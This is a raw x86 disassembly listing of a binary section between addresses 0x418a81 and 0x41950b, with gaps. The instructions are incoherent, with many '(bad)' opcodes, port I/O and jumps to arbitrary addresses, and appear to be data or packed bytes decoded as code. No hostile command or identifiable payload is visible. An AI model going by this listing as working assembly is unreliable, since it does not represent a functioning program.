  418a81:	stos   DWORD PTR es:[edi],eax
  418a82:	sbb    al,0xf5
  418a84:	out    dx,eax
  418a85:	inc    edx
  418a87:	pop    edx
  418a88:	mov    eax,0x7310369c
  418a8d:	(bad)  
  418a8e:	(bad)  
  418a8f:	dec    esp
  418a90:	mov    eax,0x9db8057b
  418a95:	pushf  
  418a96:	push   ds
  418a97:	imul   ebx,DWORD PTR [eax],0x75
  418a9a:	mov    ebp,0xd9a9196b
  418a9f:	adc    BYTE PTR [edx-0x23],0x27
  418aa3:	sbb    esp,0x9d9f810d
  418aa9:	call   0xbf98350e
  418aae:	fdivr  DWORD PTR [eax-0x2c]
  418ab1:	mov    ?,eax
  418ab3:	adc    al,ch
	...
  418b15:	add    BYTE PTR [ebx+edx*1-0x7b],bh
  418b19:	xor    ch,bh
  418b1b:	mov    dh,0xff
  418b1d:	pop    edi
  418b1e:	mov    al,ds:0x1a0941ce
  418b23:	pop    es
  418b24:	inc    ecx
  418b25:	(bad)  
  418b26:	push   edx
  418b27:	add    eax,DWORD PTR [ecx]
  418b29:	add    BYTE PTR [edi],al
  418b2b:	add    DWORD PTR [eax],eax
  418b2d:	add    BYTE PTR [edi],bl
  418b2f:	dec    ebp
  418b30:	mov    bh,ah
  418b32:	stos   BYTE PTR es:[edi],al
  418b33:	ds out dx,eax
  418b35:	(bad)  
  418b36:	cmp    ecx,DWORD PTR [edi]
  418b38:	adc    al,0xe
  418b3a:	xchg   esi,eax
  418b3b:	add    eax,0x77a01293
  418b40:	stos   DWORD PTR es:[edi],eax
  418b41:	(bad)
  418b45:	xor    eax,DWORD PTR [edx]
  418b47:	mov    ch,0x1c
  418b49:	out    0x90,eax
  418b4b:	cmp    edi,0x2208e089
  418b51:	fdivr  DWORD PTR [eax-0x1a4975a7]
  418b57:	in     eax,0x63
  418b59:	add    esp,DWORD PTR [esi]
  418b5b:	jmp    0xe6f5d695
  418b60:	mov    esi,0xf8a764b6
  418b65:	call   0x49594bc1
  418b6a:	icebp  
  418b6b:	sub    dl,BYTE PTR [edi]
  418b6d:	mov    dl,0x87
  418b6f:	in     eax,dx
  418b70:	sub    bl,BYTE PTR [esi-0x5104d725]
  418b76:	sbb    BYTE PTR ss:[edx],0x32
  418b7a:	imul   edi,DWORD PTR [esi+0x61cb21cb],0xc540855b
  418b84:	jbe    0x418b08
  418b86:	bswap  eax
  418b88:	pushf  
  418b89:	mov    dl,0xb6
  418b8b:	cmp    dh,BYTE PTR [esi+edi*2+0x5c4b7fa4]
  418b92:	adc    al,0x10
  418b94:	adc    eax,0xaf2395f0
  418b99:	xor    BYTE PTR [eax-0x6b],cl
  418b9c:	imul   esi,ebp,0x62bc38e8
  418ba2:	rcr    al,1
  418ba4:	dec    edx
  418ba5:	repnz sub BYTE PTR [eax],dh
  418ba8:	dec    ecx
  418ba9:	cwde   
  418baa:	dec    ebp
  418bab:	and    BYTE PTR [edx+0x297ea269],bl
  418bb1:	call   0xc065:0xc52e78d7
  418bb8:	lea    ebp,[eax+edx*8-0x6f]
  418bbc:	ins    BYTE PTR es:[edi],dx
  418bbd:	adc    dh,BYTE PTR [edi+edi*2+0x21]
  418bc1:	(bad)  
  418bc2:	out    dx,eax
  418bc3:	mov    ecx,0xfc7ba97f
  418bc8:	adc    BYTE PTR ds:0x3da7c366,0xc5
  418bcf:	inc    eax
  418bd0:	or     al,0xaf
  418bd2:	mov    ch,0xbd
  418bd4:	nop
  418bd5:	lock daa 
  418bd7:	repz in eax,0x44
  418bda:	cdq    
  418bdb:	arpl   WORD PTR ds:0x6eb54d32,cx
  418be1:	out    0xfb,eax
  418be3:	xchg   BYTE PTR [edx],bl
  418be5:	jp     0x418c4a
  418be7:	rol    BYTE PTR [esi+ebx*4-0x1b],0x6a
  418bec:	bound  edi,QWORD PTR [ebx]
  418bee:	xor    BYTE PTR [ebx],al
  418bf0:	sbb    dh,bl
  418bf2:	retf   0xf330
  418bf5:	inc    ecx
  418bf6:	shl    BYTE PTR [ebp-0x22],1
  418bf9:	inc    ecx
  418bfa:	mov    ebp,0x986ac2d5
  418bff:	pop    esi
  418c00:	sbb    al,0xf3
  418c02:	jle    0x418c7e
  418c04:	es cdq 
  418c06:	pop    ds
  418c07:	xchg   ebx,eax
  418c08:	mov    ds:0x1e130dd5,al
  418c0d:	jecxz  0x418c71
  418c0f:	fwait
  418c10:	jle    0x418c6e
  418c12:	jle    0x418c6f
  418c14:	lea    ebx,[ebp-0x3b88f63c]
  418c1a:	es mov ah,0x61
  418c1d:	cmp    al,0x80
  418c1f:	jg     0x418c62
  418c21:	cmp    DWORD PTR [edi+ecx*4+0x40],edi
  418c25:	or     al,0xe7
  418c27:	mov    ebx,0xe1996425
  418c2c:	adc    eax,0x1c9266e6
  418c31:	mov    ecx,0x9e22f5
	...
  418c96:	sti    
  418c97:	inc    edx
  418c98:	out    dx,al
  418c99:	aas    
  418c9a:	(bad)  
  418c9b:	mov    edi,0x9c1c6fb
  418ca0:	scas   al,BYTE PTR es:[edi]
  418ca1:	adc    eax,DWORD PTR [eax-0x16]
  418ca4:	add    eax,0x1045987
  418ca9:	add    BYTE PTR [edi],al
  418cab:	add    DWORD PTR [eax],eax
  418cad:	add    BYTE PTR [edx-0x770afb4],cl
  418cb3:	repz cmp BYTE PTR [edx+esi*4+0x8db69fd],dl
  418cbb:	xchg   BYTE PTR [edx+0x43],ah
  418cbe:	lock mov edx,0x30365bc3
  418cc4:	sub    al,BYTE PTR [ebx-0x3d]
  418cc7:	dec    esi
  418cc8:	jnp    0x418d48
  418cca:	stos   DWORD PTR es:[edi],eax
  418ccb:	scas   eax,DWORD PTR es:[edi]
  418ccc:	push   ebp
  418ccd:	cmp    dl,BYTE PTR [eax+0x3f]
  418cd0:	jb     0x418d30
  418cd2:	stos   DWORD PTR es:[edi],eax
  418cd3:	xor    ch,ch
  418cd5:	adc    eax,0xf7584cb
  418cda:	repz push esi
  418cdc:	adc    BYTE PTR [eax+0x31],cl
  418cdf:	mov    ?,eax
  418ce1:	rcr    BYTE PTR [ebx+0x47],0xe1
  418ce5:	(bad)  
  418ce6:	in     eax,0x4d
  418ce8:	adc    dh,bl
  418cea:	loop   0x418c76
  418cec:	out    0x31,eax
  418cee:	std    
  418cef:	inc    ebx
  418cf0:	pop    edx
  418cf1:	cdq    
  418cf2:	jne    0x418ced
  418cf4:	pop    esp
  418cf5:	pop    edx
  418cf6:	sar    BYTE PTR [edi-0x7ffcbb10],cl
  418cfc:	leave  
  418cfd:	xchg   BYTE PTR [edi],ah
  418cff:	mov    al,dl
  418d01:	leave  
  418d02:	cmp    esp,DWORD PTR [eax]
  418d04:	sbb    edi,edi
  418d06:	into   
  418d07:	sti    
  418d08:	mul    DWORD PTR [eax-0x7f]
  418d0b:	(bad)  
  418d0c:	or     eax,0x4642143
  418d11:	in     eax,dx
  418d12:	ffreep st(3)
  418d14:	mov    esi,0x7c03d303
  418d19:	jbe    0x418d70
  418d1b:	mov    cl,0x43
  418d1d:	int    0x22
  418d1f:	sub    esi,DWORD PTR [edx]
  418d21:	jmp    0x418d3d
  418d23:	inc    DWORD PTR [edx]
  418d25:	nop
  418d26:	adc    BYTE PTR [ecx],0x1
  418d29:	outs   dx,DWORD PTR ds:[esi]
  418d2a:	popf   
  418d2b:	push   edx
  418d2c:	ret    
  418d2d:	cmp    al,0x20
  418d2f:	xor    al,0x45
  418d31:	xor    dh,BYTE PTR [ebx]
  418d33:	sub    al,0x52
  418d35:	dec    eax
  418d36:	mov    ch,BYTE PTR [ebx-0x2d]
  418d39:	or     DWORD PTR [eax],edi
  418d3b:	xor    al,0xbf
  418d3d:	lahf   
  418d3e:	aas    
  418d3f:	retf   
  418d40:	call   DWORD PTR [edi]
  418d42:	mov    cl,0x96
  418d44:	pop    ebx
  418d45:	ja     0x418d3e
  418d47:	mov    esp,0x66a2897b
  418d4c:	mov    ah,0xd7
  418d4e:	fst    QWORD PTR [ecx]
  418d50:	fdiv   DWORD PTR ds:0x6c628528
  418d56:	retf   0x464a
  418d59:	stos   BYTE PTR es:[edi],al
  418d5a:	cmp    bh,BYTE PTR [edx]
  418d5c:	sub    al,0xc3
  418d5e:	cdq    
  418d5f:	je     0x418cf4
  418d61:	adc    bh,0xda
  418d64:	or     eax,0x6398239d
  418d69:	es jae 0x418de2
  418d6c:	pushf  
  418d6d:	mov    ah,BYTE PTR [eax+0x64]
  418d70:	daa    
  418d71:	cmp    ecx,DWORD PTR [edi]
  418d73:	sbb    al,0xf1
  418d75:	inc    esp
  418d76:	jmp    0xb09e:0x30d1834c
  418d7d:	mov    ds:0x40135208,eax
  418d82:	fnstsw WORD PTR [ebp+edi*4-0x23]
  418d86:	seto   BYTE PTR [ecx-0x42]
  418d8a:	xor    al,0x12
  418d8c:	out    dx,al
  418d8d:	(bad)  
  418d8e:	jge    0x418db7
  418d90:	cld    
  418d91:	addr16 mov ch,0x6c
  418d94:	lods   eax,DWORD PTR ds:[esi]
  418d95:	and    edi,edx
  418d97:	je     0x418d45
  418d99:	repz xchg ecx,eax
  418d9b:	mov    edi,0xf8e5961f
  418da0:	loop   0x418dea
  418da2:	sbb    dh,BYTE PTR [eax-0x3f]
  418da5:	icebp  
  418da6:	or     ch,ch
  418da8:	sti    
  418da9:	scas   al,BYTE PTR es:[edi]
  418daa:	mov    WORD PTR [ebp+esi*1+0xa],?
  418dae:	leave  
  418daf:	pusha  
  418db0:	in     eax,0x9
  418db2:	popa   
  418db3:	icebp  
  418db4:	mov    es,WORD PTR [eax]
	...
  418e16:	push   cs
  418e17:	bnd call 0xde7c8a4d
  418e1d:	(bad)  
  418e1e:	jl     0x418e26
  418e20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e21:	mov    al,ds:0x5598829
  418e26:	pusha  
  418e27:	add    eax,0x1070001
  418e2c:	add    BYTE PTR [eax],al
  418e2e:	lods   eax,DWORD PTR ds:[esi]
  418e2f:	imul   esi,DWORD PTR [esi],0x6f92f81f
  418e35:	add    al,0x5b
  418e38:	outs   dx,BYTE PTR ds:[esi]
  418e39:	retf   0xa868
  418e3c:	pop    ebx
  418e3d:	mov    esi,0xd240f2e5
  418e42:	sbb    eax,0x429a42ff
  418e47:	cmp    dl,al
  418e49:	es in  eax,0x71
  418e4c:	lahf   
  418e4d:	dec    edx
  418e4e:	std    
  418e4f:	or     eax,0x1f54984c
  418e54:	sbb    BYTE PTR [eax],cl
  418e56:	pushfw 
  418e58:	and    edx,DWORD PTR [esi-0x38]
  418e5b:	les    ebp,FWORD PTR [ebx-0x72bc707d]
  418e61:	dec    edx
  418e62:	fistp  QWORD PTR [edi-0x1c4425a5]
  418e68:	sub    DWORD PTR [edx-0x2f],0xffffff8b
  418e6c:	inc    ecx
  418e6d:	imul   ebx
  418e6f:	ret    
  418e70:	sub    dh,BYTE PTR [edi+edx*1+0x4d269c5c]
  418e77:	sub    al,0x63
  418e79:	repz retf 
  418e7b:	jmp    0x67493004
  418e80:	(bad)  [edx]
  418e82:	out    dx,al
  418e83:	ja     0x418e88
  418e85:	mov    ds:0xefb82aba,al
  418e8a:	or     ah,bl
  418e8c:	jae    0x418e6f
  418e8e:	cmp    BYTE PTR [bp+si+0x6a2f],0x65
  418e94:	mov    dh,0x35
  418e96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418e97:	xor    ebx,DWORD PTR [ebx-0x39]
  418e9a:	arpl   WORD PTR [edx],bx
  418e9c:	xor    eax,0x2887a581
  418ea1:	lock out dx,eax
  418ea3:	(bad)  
  418ea4:	aam    0xc
  418ea6:	ins    BYTE PTR es:[edi],dx
  418ea7:	mov    ds:0x4f4cbc85,al
  418eac:	xor    eax,0x44b49f10
  418eb1:	mov    ebx,0xee52c504
  418eb6:	call   0xcffd:0xb1162bda
  418ebd:	repz mov ds,WORD PTR [ebp-0x5b2cfc5c]
  418ec4:	mov    esp,0x3416d0ef
  418ec9:	loope  0x418f29
  418ecb:	sub    ecx,esi
  418ecd:	mov    esi,0x228e38db
  418ed2:	int    0x65
  418ed4:	fst    DWORD PTR [edi-0x59]
  418ed7:	adc    ah,ah
  418ed9:	jbe    0x418ee8
  418edb:	test   BYTE PTR [ebp+0xbf4debc],ch
  418ee1:	jne    0x418f1f
  418ee3:	mov    eax,ds:0x9ec623b3
  418ee8:	push   ss
  418ee9:	adc    ebx,ebx
  418eeb:	dec    ecx
  418eec:	repnz pop ecx
  418eee:	dec    edx
  418eef:	mov    esi,0x14ac747b
  418ef4:	jp     0x418e81
  418ef6:	mov    ah,0xc6
  418ef8:	cs in  al,0x15
  418efb:	(bad)  
  418efc:	adc    eax,0xa5558205
  418f01:	jmp    0xf4c9:0x58cbbb6f
  418f08:	push   cs
  418f09:	push   esp
  418f0a:	sub    cl,BYTE PTR [edx-0x34]
  418f0d:	lock dec ebx
  418f0f:	or     al,0x8d
  418f11:	fldenv [ebp-0x2f875320]
  418f17:	push   ds
  418f18:	aaa    
  418f19:	test   DWORD PTR [eax-0x48],0x9da684df
  418f20:	mov    esp,0xf2052084
  418f25:	ret    
  418f26:	in     eax,0xf0
  418f28:	aad    0x5d
  418f2a:	dec    ecx
  418f2b:	sub    BYTE PTR [ebx],cl
  418f2d:	fdivr  QWORD PTR [edx-0x4e]
  418f30:	arpl   bp,ax
  418f32:	dec    ebp
  418f33:	lods   al,BYTE PTR ds:[esi]
  418f34:	cmp    eax,0x0
	...
  418f95:	add    BYTE PTR [edi+edx*4],bl
  418f98:	in     al,0x47
  418f9a:	out    dx,eax
  418f9b:	ja     0x418f5c
  418f9d:	fist   WORD PTR [ebp-0x5585234e]
  418fa3:	push   cs
  418fa4:	or     eax,0x1066757
  418fa9:	add    BYTE PTR [edi],al
  418fab:	add    DWORD PTR [eax],eax
  418fad:	add    BYTE PTR [edx-0x30],bl
  418fb0:	inc    edx
  418fb1:	(bad)  
  418fb2:	xor    bh,ah
  418fb4:	and    al,0x89
  418fb6:	(bad)  
  418fb7:	popf   
  418fb8:	bound  ebx,QWORD PTR [ecx+ebp*2+0x3a97f46a]
  418fbf:	or     eax,0x479f810b
  418fc4:	scas   eax,DWORD PTR es:[edi]
  418fc5:	cdq    
  418fc6:	sub    DWORD PTR [eax-0x2c],0x12a4f35b
  418fcd:	inc    ebx
  418fce:	les    edi,FWORD PTR [ecx+0x5f]
  418fd1:	mov    ch,0x8c
  418fd3:	sbb    eax,0x990ce83
  418fd8:	sbb    DWORD PTR [ebx],0x54
  418fdb:	clc    
  418fdc:	sbb    BYTE PTR [edx+0x475bacdd],ch
  418fe2:	(bad)  
  418fe3:	fst    DWORD PTR [ebx-0x581eabc8]
  418fe9:	adc    DWORD PTR [esp+eiz*4],eax
  418fec:	repnz add BYTE PTR [ecx-0x7f],bl
  418ff0:	ror    BYTE PTR [esi+0x23],1
  418ff3:	outs   dx,DWORD PTR ds:[esi]
  418ff4:	sub    eax,0x5e19718b
  418ff9:	cmp    bh,dl
  418ffb:	xor    al,0x4c
  418ffd:	add    BYTE PTR [esi-0x4ef81a05],ch
  419003:	lods   al,BYTE PTR ds:[esi]
  419004:	aaa    
  419005:	test   al,0x85
  419007:	sbb    eax,0x80fe8be1
  41900c:	lock or BYTE PTR ds:0x1c93988b,ch
  419013:	loope  0x418fcf
  419015:	jmp    0x419076
  419017:	mov    ecx,0xd795edec
  41901c:	outs   dx,BYTE PTR gs:[esi]
  41901e:	xor    BYTE PTR [ecx],ah
  419020:	retf   
  419021:	jbe    0x418fc3
  419023:	into   
  419024:	mov    ch,0x8b
  419026:	sbb    ah,ch
  419028:	or     edx,DWORD PTR [ebx+0x40a83e68]
  41902e:	sbb    ch,cl
  419030:	ror    DWORD PTR [esi],0xb9
  419033:	cmp    DWORD PTR [ebp-0x7cefaff2],ebx
  419039:	push   ebx
  41903a:	xor    ch,bl
  41903c:	icebp  
  41903d:	xchg   ebx,eax
  41903e:	sub    al,0xde
  419040:	repnz cdq 
  419042:	adc    edx,DWORD PTR [eax+0x500609f9]
  419048:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419049:	pop    es
  41904a:	jmp    0xd62faf62
  41904f:	xchg   ebx,eax
  419050:	fcmovbe st,st(2)
  419052:	sub    ah,BYTE PTR [ebp-0x47d05d5c]
  419058:	xchg   esp,eax
  419059:	pop    ss
  41905a:	xchg   ebp,eax
  41905b:	rol    BYTE PTR [esi+0x2b],cl
  41905e:	and    BYTE PTR [ebp-0x68aa1dab],bh
  419064:	and    al,0xa2
  419066:	add    bh,BYTE PTR [eax]
  419068:	push   es
  419069:	dec    ebx
  41906a:	std    
  41906b:	js     0x41902e
  41906d:	loopne 0x4190a6
  41906f:	jb     0x419055
  419071:	pushf  
  419072:	sbb    al,0x37
  419074:	xchg   dx,ax
  419076:	sbb    bl,dl
  419078:	sub    dh,BYTE PTR [ecx-0x70]
  41907b:	xor    eax,DWORD PTR [edx]
  41907d:	cmp    al,0x82
  41907f:	mov    esi,0x986d9b09
  419084:	lods   al,BYTE PTR ds:[esi]
  419085:	push   esi
  419086:	push   esp
  419087:	fsub   QWORD PTR [ebp+0x3f088c73]
  41908d:	mov    esi,0x435ab8a
  419092:	ins    DWORD PTR es:[edi],dx
  419093:	fwait
  419094:	cli    
  419095:	mov    BYTE PTR [ecx+esi*2-0x69ca7bc2],dh
  41909c:	mov    dh,BYTE PTR [ebx+0x6e39da81]
  4190a2:	fsub   QWORD PTR [ecx]
  4190a4:	leave  
  4190a5:	mov    al,0xe3
  4190a7:	add    eax,0x531cbbc6
  4190ac:	mov    esi,0xc31bc2a7
  4190b1:	or     dh,ah
  4190b3:	xor    eax,0x52
	...
  419114:	add    BYTE PTR [eax],al
  419116:	scas   eax,DWORD PTR es:[edi]
  419117:	test   DWORD PTR [esi-0xa441be],ebx
  41911d:	in     eax,dx
  41911e:	daa    
  41911f:	jle    0x4190b5
  419121:	add    eax,eax
  419123:	sub    DWORD PTR [eax],ebx
  419125:	mov    ebx,0x1076e
  41912a:	pop    es
  41912b:	add    DWORD PTR [eax],eax
  41912d:	add    bl,bh
  41912f:	push   ds
  419130:	mov    al,ds:0xe0f4f5e0
  419135:	fmul   QWORD PTR [edx-0x14]
  419138:	or     al,0x28
  41913a:	mov    eax,ds:0x48651522
  41913f:	xor    al,0x5a
  419141:	and    eax,0x20fa8e78
  419146:	mov    cl,0x22
  419148:	sub    BYTE PTR [eax-0x48924b76],ch
  41914e:	or     DWORD PTR [esi+0x47],esi
  419151:	sub    eax,DWORD PTR [ebp+0x7]
  419154:	mov    ds:0xcb491f9,al
  419159:	dec    esi
  41915a:	sti    
  41915b:	(bad)  
  41915d:	pushf  
  41915e:	mov    ?,WORD PTR [ebx-0x68a97d9f]
  419164:	jne    0x419112
  419166:	dec    esi
  419167:	and    DWORD PTR [ebx],edx
  419169:	pop    ecx
  41916a:	rcl    BYTE PTR ds:0x4f109784,1
  419170:	clc    
  419171:	mov    cl,cl
  419173:	cmp    BYTE PTR es:[ecx+0x38999fa0],ah
  41917a:	push   eax
  41917b:	or     ebp,edi
  41917d:	fs mov bh,0x28
  419180:	push   es
  419181:	jne    0x4191d6
  419183:	adc    ah,ah
  419185:	mov    edi,0xaaaf2b16
  41918a:	(bad)
  41918e:	ret    
  41918f:	xor    al,0x52
  419191:	pop    edx
  419192:	data16 hlt 
  419194:	mov    ds:0x4cff5097,al
  419199:	in     eax,dx
  41919a:	jo     0x419123
  41919c:	mov    edx,0x4141260d
  4191a1:	or     DWORD PTR [ecx],ebx
  4191a3:	jecxz  0x41912c
  4191a5:	jl     0x419215
  4191a7:	sub    bl,BYTE PTR [edi-0x6b]
  4191aa:	sbb    cl,bl
  4191ac:	in     eax,dx
  4191ad:	sub    al,0x40
  4191af:	sub    DWORD PTR [eax-0x77],edx
  4191b2:	frstor [edx+0x33077d52]
  4191b8:	jecxz  0x419175
  4191ba:	push   0x49
  4191bc:	pop    es
  4191bd:	jmp    0xde4a:0xb73b61c
  4191c4:	lods   al,BYTE PTR ds:[esi]
  4191c5:	xchg   BYTE PTR [ebp+0x7],dl
  4191c8:	cs cld 
  4191ca:	lods   eax,DWORD PTR ds:[esi]
  4191cb:	sub    al,0x25
  4191cd:	mov    BYTE PTR [edx+0x1783dddb],0x96
  4191d4:	outs   dx,BYTE PTR ss:[esi]
  4191d6:	sbb    al,0x2d
  4191d8:	leave  
  4191d9:	and    ebp,eax
  4191db:	cld    
  4191dc:	jns    0x4191bc
  4191de:	(bad)  
  4191df:	out    dx,al
  4191e0:	outs   dx,BYTE PTR ds:[esi]
  4191e1:	push   ebp
  4191e2:	dec    ebx
  4191e3:	lahf   
  4191e4:	and    BYTE PTR [eax],0x7b
  4191e7:	fadd   DWORD PTR [esi-0x259cb999]
  4191ed:	mov    esi,0x152dd5a9
  4191f2:	pushf  
  4191f3:	jecxz  0x4191fa
  4191f5:	inc    ecx
  4191f6:	pop    esp
  4191f7:	push   ecx
  4191f8:	in     al,0xfe
  4191fa:	stc    
  4191fb:	int    0x2
  4191fd:	cld    
  4191fe:	jns    0x41927b
  419200:	bound  eax,QWORD PTR [edi+0x3b0f8ba]
  419206:	sbb    DWORD PTR ds:0x246d0734,edx
  41920c:	shl    DWORD PTR [ecx+0x2c95e29d],cl
  419212:	pusha  
  419213:	mov    ebx,0xeb5af39d
  419218:	cmp    DWORD PTR [esi+0x19],esi
  41921b:	ret    
  41921c:	adc    BYTE PTR [ecx],al
  41921e:	sbb    DWORD PTR [eax-0x17],ebp
  419221:	aaa    
  419222:	test   al,0x1a
  419224:	outs   dx,DWORD PTR ds:[esi]
  419225:	out    dx,al
  419226:	sti    
  419227:	pop    ebp
  419228:	test   DWORD PTR [ebp+0x24],0x26a37920
  41922f:	sub    BYTE PTR [edx],0x9
  419232:	pop    es
  419233:	xlat   BYTE PTR ds:[ebx]
  419234:	mov    ebx,0x0
	...
  419295:	add    BYTE PTR [eax-0xcc4519],ah
  41929b:	jg     0x419246
  41929d:	idiv   DWORD PTR [edi+ebx*2]
  4192a0:	mov    esp,0x15a6e34f
  4192a5:	iret   
  4192a6:	jne    0x4192b0
  4192a8:	add    DWORD PTR [eax],eax
  4192aa:	pop    es
  4192ab:	add    DWORD PTR [eax],eax
  4192ad:	add    BYTE PTR [edx],dl
  4192af:	and    dh,BYTE PTR [ebp+0x26]
  4192b2:	and    eax,DWORD PTR [ebx+0x7f]
  4192b5:	pop    edx
  4192b6:	fwait
  4192b7:	iret   
  4192b8:	daa    
  4192b9:	xchg   ebp,eax
  4192ba:	adc    ah,BYTE PTR [ebx+0x58]
  4192bd:	mov    esp,0x72f5ab44
  4192c2:	in     al,0xff
  4192c4:	lahf   
  4192c5:	and    eax,0x685fd3ff
  4192ca:	std    
  4192cb:	add    DWORD PTR [ebx],0x72
  4192ce:	pop    ebx
  4192cf:	cmp    BYTE PTR [esi],al
  4192d1:	cld    
  4192d2:	push   ecx
  4192d3:	lods   al,BYTE PTR ds:[esi]
  4192d4:	sub    DWORD PTR [ecx+0x55c14d27],ecx
  4192da:	sbb    esi,edi
  4192dc:	(bad)  
  4192dd:	mov    ah,0x1d
  4192df:	inc    edi
  4192e0:	mov    ebx,0x8ab070c
  4192e5:	ds dec edx
  4192e7:	push   ecx
  4192e8:	ins    DWORD PTR es:[edi],dx
  4192e9:	rol    ch,cl
  4192eb:	daa    
  4192ec:	or     al,0x4c
  4192ee:	xor    BYTE PTR [ebp+0x6b7acf8f],ch
  4192f4:	mov    al,ds:0xb829f9f3
  4192f9:	jae    0x4192d0
  4192fb:	int    0x7e
  4192fd:	sti    
  4192fe:	popa   
  4192ff:	aad    0xfb
  419301:	mov    dh,0xf8
  419303:	sti    
  419304:	out    dx,al
  419305:	xor    eax,0x1e298dd9
  41930a:	into   
  41930b:	jle    0x419295
  41930d:	scas   al,BYTE PTR es:[edi]
  41930e:	mov    esp,0x3f3d61d8
  419313:	adc    eax,0xa26a0581
  419318:	ja     0x4192c1
  41931a:	test   DWORD PTR [edx],eax
  41931c:	(bad)  
  41931d:	fdiv   st(2),st
  41931f:	aas    
  419320:	shr    BYTE PTR [ecx+0x5d],0x30
  419324:	jno    0x4192b7
  419326:	mov    dl,0x80
  419328:	xor    esi,DWORD PTR [ebx+eax*2-0x4]
  41932c:	iret   
  41932d:	data16 loopne 0x4192ed
  419330:	fsubr  st(5),st
  419332:	sbb    ch,0x53
  419335:	xchg   ecx,eax
  419336:	loop   0x4192c9
  419338:	xor    eax,0xd7da131c
  41933d:	lock fstp TBYTE PTR [esi-0x5a]
  419341:	sbb    dl,BYTE PTR ds:[ebp-0x7dab3059]
  419348:	jl     0x41938c
  41934a:	xchg   ebp,eax
  41934b:	or     al,BYTE PTR [esp+edx*2+0x587e9d4c]
  419352:	sbb    edi,DWORD PTR [eax+0x4eeff397]
  419358:	dec    ebx
  419359:	in     eax,0x51
  41935b:	(bad)  
  41935c:	fild   DWORD PTR [eax]
  41935e:	inc    edi
  41935f:	add    ch,dl
  419361:	mov    eax,DWORD PTR [ebx-0x2633c4ae]
  419367:	add    eax,0xf5141852
  41936c:	mov    al,ds:0xda0e5eaa
  419371:	retf   0xaffb
  419374:	dec    esi
  419375:	retf   
  419376:	mov    bh,0xf3
  419378:	jp     0x4193f5
  41937a:	pop    es
  41937b:	push   ss
  41937c:	repnz xor DWORD PTR [ecx+0x35d1fa3b],0x7
  419384:	cs fcomp st(5)
  419387:	pop    ds
  419388:	ins    DWORD PTR es:[edi],dx
  419389:	mov    edi,DWORD PTR [esi-0x7b27e50f]
  41938f:	dec    edi
  419390:	out    dx,eax
  419391:	push   ecx
  419392:	mov    ds:0xfa161f67,eax
  419397:	mov    ds:0x9e407cec,eax
  41939c:	cmp    DWORD PTR [ebx-0x70],0xffffffa2
  4193a0:	and    DWORD PTR [ecx],0x1fa836da
  4193a6:	sbb    BYTE PTR [edx],bh
  4193a8:	xor    al,0xf7
  4193aa:	adc    dh,dh
  4193ac:	sub    cl,BYTE PTR [ebx]
  4193ae:	inc    eax
  4193af:	sbb    cl,ch
  4193b1:	or     eax,0xe04b69
	...
  419416:	cmp    eax,0xed3a6998
  41941b:	sti    
  41941c:	jg     0x4193bd
  41941e:	les    ecx,FWORD PTR [ebp+ebp*8-0x33b41ac9]
  419425:	out    dx,eax
  419426:	jl     0x419431
  419428:	add    DWORD PTR [eax],eax
  41942a:	pop    es
  41942b:	add    DWORD PTR [eax],eax
  41942d:	add    BYTE PTR [ecx+0x38],dh
  419430:	pop    eax
  419431:	sub    ecx,edx
  419433:	sub    bl,BYTE PTR [eax+eiz*1]
  419436:	ins    BYTE PTR es:[edi],dx
  419437:	push   0x5df7fad8
  41943c:	dec    edx
  41943d:	ja     0x41945e
  41943f:	lea    ebp,[edx-0x69a0426d]
  419445:	dec    esi
  419446:	mov    eax,ds:0x145fa3c
  41944b:	fbstp  TBYTE PTR [ebx]
  41944d:	jno    0x419496
  41944f:	popf   
  419450:	mov    cl,0x99
  419452:	mov    ecx,0x8fd33234
  419457:	dec    esp
  419458:	lods   al,BYTE PTR ds:[esi]
  419459:	mov    esi,0x2b1bdb6d
  41945e:	call   0xecd80852
  419463:	jb     0x419436
  419465:	loope  0x4193fd
  419467:	pop    es
  419468:	in     eax,0x94
  41946a:	push   eax
  41946b:	test   al,0x36
  41946d:	mov    dh,ch
  41946f:	int    0xcb
  419471:	and    DWORD PTR [ebp+0x76],eax
  419474:	idiv   BYTE PTR [esi-0x26]
  419477:	or     bl,BYTE PTR ds:0x34e02424
  41947d:	out    dx,eax
  41947e:	es loopne 0x419457
  419481:	mov    bh,0xd9
  419483:	xchg   ecx,eax
  419484:	and    edx,DWORD PTR [ecx]
  419486:	adc    bl,0x8e
  419489:	mov    eax,ds:0xf5d4c893
  41948e:	cs ins BYTE PTR es:[edi],dx
  419490:	push   ss
  419491:	in     eax,dx
  419492:	dec    esp
  419493:	and    bl,BYTE PTR [ebx]
  419495:	and    al,0x3f
  419497:	adc    eax,0x8c12dee4
  41949c:	lock add BYTE PTR [esp+ebx*4-0x11],dl
  4194a1:	gs jecxz 0x4194bd
  4194a4:	stos   DWORD PTR es:[edi],eax
  4194a5:	adc    al,0x3e
  4194a8:	cli    
  4194a9:	test   DWORD PTR [ecx],eax
  4194ab:	fwait
  4194ac:	std    
  4194ad:	icebp  
  4194ae:	pusha  
  4194af:	mov    ch,0xb4
  4194b1:	test   BYTE PTR [eax+0x53],bl
  4194b4:	in     al,0xcc
  4194b6:	adc    eax,0x9d40259f
  4194bb:	cmp    ah,BYTE PTR [edx-0x64]
  4194be:	inc    edx
  4194bf:	push   es
  4194c0:	loop   0x4194a5
  4194c2:	call   0x8f24bb04
  4194c7:	pop    eax
  4194c8:	adc    dl,BYTE PTR [ebx+0x3dfafeb1]
  4194ce:	push   es
  4194cf:	jle    0x419544
  4194d1:	or     eax,0x7d796b89
  4194d6:	cmp    edi,DWORD PTR [ebx]
  4194d8:	jg     0x419544
  4194da:	pop    edx
  4194db:	cld    
  4194dc:	hlt    
  4194dd:	inc    eax
  4194de:	sub    al,0x5d
  4194e0:	out    dx,eax
  4194e1:	dec    ecx
  4194e2:	adc    ah,BYTE PTR [ebp+0x22]
  4194e5:	mov    esi,0x46852553
  4194ea:	push   eax
  4194eb:	xchg   ecx,eax
  4194ec:	ins    BYTE PTR es:[edi],dx
  4194ed:	cmp    DWORD PTR [ebx+0x3bf61c6f],eax
  4194f3:	xchg   DWORD PTR [esi],ecx
  4194f5:	loope  0x419570
  4194f7:	repnz shl DWORD PTR [eax+0x3951d292],0x44
  4194ff:	lahf   
  419500:	pop    es
  419501:	sub    al,0x2b
  419503:	retf   0xa37c
  419506:	test   eax,edi
  419508:	ins    BYTE PTR es:[edi],dx
  419509:	daa    
  41950a:	dec    edi
  41950b:	popf   
